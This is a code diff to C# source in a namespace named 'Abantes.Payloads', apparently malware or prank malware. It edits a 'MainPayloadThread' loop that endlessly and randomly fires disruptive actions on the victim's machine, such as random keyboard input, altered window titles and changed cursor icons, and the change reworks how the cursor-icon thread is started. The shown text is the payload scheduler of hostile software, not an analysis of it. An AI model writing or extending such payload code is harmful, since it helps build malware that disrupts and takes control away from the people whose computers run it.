@@ -21,7 +21,7 @@ namespace Abantes.Payloads
         static Random _random = new Random();
         public static void MainPayloadThread()
         {
-            Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
+            
             while (true)
             {
                 switch (_random.Next(13))
@@ -35,16 +35,10 @@ namespace Abantes.Payloads
                         randomKeyboard.Start();
                         break;
                     case 2:
-                        if (_random.Next(100) > 50)
-                        {
-                            cursoricon.Start();
-                        }
-                        else
-                        {
-                            Annoying.ChangeWindowText();
-                        }
+                         Annoying.ChangeWindowText();
                         break;
                     case 3:
+                        Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
                         cursoricon.Start();
                         break;
                     case 4:
